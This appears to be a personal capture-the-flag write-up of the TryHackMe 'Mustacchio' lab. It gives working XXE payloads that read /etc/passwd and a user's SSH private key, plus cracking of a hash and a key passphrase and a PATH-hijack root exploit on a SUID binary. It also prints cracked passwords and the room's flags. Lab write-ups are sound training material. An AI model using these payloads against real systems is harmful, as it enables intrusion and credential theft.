https://tryhackme.com/room/mustacchio

### Nmap

```
   │   ~/De/TH/mustacchio ▓▒░ nmap -p- -T5 --min-rate=10000 10.10.137.250              ░▒▓ ✔ │ 26s   │ 19:51:33   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-02 19:54 IST
Nmap scan report for 10.10.137.250
Host is up (0.14s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8765/tcp open  ultraseek-http
```


### HTTP 1

- port 80 has a blog page with nothing in source code 

- found this in feroxbuster

http://10.10.137.250/custom/js/users.bak

- on viewing the contents i can see 

```
   │   ~/De/TH/mustacchio ▓▒░ strings users.bak                                         ░▒▓ ✔ │ 7s   │ 20:17:02   
SQLite format 3
tableusersusers
CREATE TABLE users(username text NOT NULL, password text NOT NULL)
]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```


- cracked the hash at https://hashes.com/en/decrypt/hash

`1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:bulldog19`


### HTTP 2

- http://10.10.137.250:8765/ is a login page

we are able to login with

`admin:bulldog19`


- we are redirected to http://10.10.137.250:8765/home.php.

when we comment something we get this in the browser response

```
    <script type="text/javascript">
      //document.cookie = "Example=/auth/dontforget.bak"; 
      function checktarea() {
      let tbox = document.getElementById("box").value;
      if (tbox == null || tbox.length == 0) {
        alert("Insert XML Code!")
      }
  }
</script>
```

- On viewing the http://10.10.137.250:8765/auth/dontforget.bak
it downloads the file

```
   │   ~/Desktop/THM/mustacchio ▓▒░ strings dontforget.bak                                      ░▒▓ ✔ │ 20:18:06   
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could
ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could
ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

- we get two potential usernames
Joe Hamd & Barry Clad

- also as per the above script, if we submit a blank comment, we get an alert saying `Insert XML code here`

- searched for `xml revers shell ` but nothing useful found and used the writeup


also found out the there is also another way of opening and viewing the `.bak` files using

```
reddevil@ubuntu:~/Documents/tryhackme/mustacchio$ sqlite3 users.bak
SQLite version 3.31.1 2020-01-27 19:55:54
```

- missed this comment on the page 

`   <!-- Barry, you can now SSH in using your key!-->`


- we should be able to get into the machineby exploiting XXE and retireving barry's SSH private key

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#detect-the-vulnerability

here we can use ## [Exploiting XXE to retrieve files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files)



- but in this case we have to use the below template for xml code

```
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his parot noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

this worked 


- updated the payload to 

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his parot noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

- this didnt work so copying the writeup one now

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&test;</com>
</comment>
```

now it returns the `/etc/passwd` contents wtf



now changing the file lcoation to `'file:///home/barry/.ssh/id_rsa'`

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///home/barry/.ssh/id_rsa'> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&test;</com>
</comment>
```

we get the private rsa key of `barry`


- but when trying to login we get to know that it is encrypted
`Enter passphrase for key 'id_rsa':`


- now using 
```
  │   ~/De/THM/mustacchio ▓▒░ sudo python2 /usr/share/john/ssh2john.py id_rsa > forjohn.txt  ░▒▓ 1 ✘ │ 20:59:02   
[sudo] password for glack: 

   │   ~/De/TH/mustacchio ▓▒░ john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt 

```

`urieljames       (id_rsa)`

- we we ssh into the machine as barry

### Priv Esc

- `barry@mustacchio:~$ find / -type f -perm -u=s -ls 2>/dev/null`

we find a custom suid bit binary

` 257605     20 -rwsr-xr-x   1 root     root          16832 Jun 12  2021 /home/joe/live_log`\

- on running the binary we are shown some sorts of logs on the `8765` port number 

- strings gives this command being run in the binary
```
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
```

here we can see that the full path of the tail binary is not being used


we can exploit this [[custom binary]]

- To exploit this, I went to the “/tmp” folder, created my own “tail” binary, added this one to the path and executed it again.

```bash
echo '/bin/bash' > tail
chmod 777 tail
export PATH=/tmp:$PATH
/home/joe/live_log
```

And with this I got root rights.


```
root@mustacchio:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1003(barry)
```


- And the flags

```
root@mustacchio:~# cat user.txt 
62d77a4d5f97d47c5aa38b3b2651b831


root@mustacchio:/root# cat root.txt 
3223581420d906c4dd1a5f9b530393a5

```

